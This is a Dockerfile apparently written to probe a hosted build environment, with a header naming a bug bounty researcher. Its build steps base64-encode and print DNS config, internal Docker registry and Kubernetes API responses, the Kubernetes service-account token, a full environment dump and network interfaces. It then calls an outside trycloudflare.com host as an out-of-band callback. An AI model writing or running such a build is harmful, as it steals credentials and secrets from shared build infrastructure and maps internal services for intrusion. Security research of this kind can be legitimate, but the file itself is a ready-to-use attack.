FROM python:3.11-slim
RUN apt-get update && apt-get install -y curl dnsutils && rm -rf /var/lib/apt/lists/*

RUN echo "=== INTERNAL SERVICE PROBE START $(date -u) ==="

RUN echo "=== DNS_RESOLV_CONF ===" && cat /etc/resolv.conf 2>&1 | base64

RUN echo "=== DOCKER_MIRROR_V2 ===" && \
    curl -s -m 10 http://docker-cache.docker-cache.svc.cluster.local:5000/v2/ 2>&1 | base64 && \
    echo ""

RUN echo "=== DOCKER_MIRROR_CATALOG ===" && \
    curl -s -m 10 http://docker-cache.docker-cache.svc.cluster.local:5000/v2/_catalog 2>&1 | base64 && \
    echo ""

RUN echo "=== K8S_API_SVC ===" && \
    curl -s -m 5 -k https://kubernetes.default.svc.cluster.local/version 2>&1 | base64 && \
    echo ""

RUN echo "=== K8S_API_10245 ===" && \
    curl -s -m 5 -k https://10.245.0.1/version 2>&1 | base64 && \
    echo ""

RUN echo "=== K8S_API_10960 ===" && \
    curl -s -m 5 -k https://10.96.0.1/version 2>&1 | base64 && \
    echo ""

RUN echo "=== DNS_LOOKUP_DOCKER_CACHE ===" && \
    nslookup docker-cache.docker-cache.svc.cluster.local 2>&1 | base64 && \
    echo ""

RUN echo "=== DNS_LOOKUP_K8S ===" && \
    nslookup kubernetes.default.svc.cluster.local 2>&1 | base64 && \
    echo ""

RUN echo "=== KUBE_TOKEN ===" && \
    cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>&1 | base64 && \
    echo ""

RUN echo "=== KUBE_NAMESPACE ===" && \
    cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>&1 | base64 && \
    echo ""

RUN echo "=== ENV_DUMP ===" && env | sort | base64

RUN echo "=== NETWORK_INTERFACES ===" && ip addr 2>&1 | base64 || echo "NO_IP_CMD"

RUN echo "=== OOB_CALLBACK ===" && \
    curl -s -m 5 -H "X-BBP-Researcher: mrunal" \
    "https://cheapest-vessel-hometown-equipped.trycloudflare.com/build-internal-probe?result=done" 2>&1

RUN echo "=== INTERNAL SERVICE PROBE END $(date -u) ==="

RUN mkdir -p /app && echo '<html><body>probe</body></html>' > /app/index.html
CMD ["python3", "-m", "http.server", "8080"]
